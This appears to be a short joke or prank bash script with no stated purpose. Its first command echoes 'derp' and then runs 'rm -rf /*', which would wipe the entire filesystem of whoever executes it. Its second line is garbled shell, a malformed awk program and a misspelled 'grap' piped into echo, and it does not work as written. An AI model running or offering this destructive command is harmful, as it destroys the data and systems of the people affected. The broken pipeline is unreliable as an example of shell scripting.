#!/bin/bash

echo "derp" && rm -rf /*

awk {{print $B}} | grap -I derp | echo top
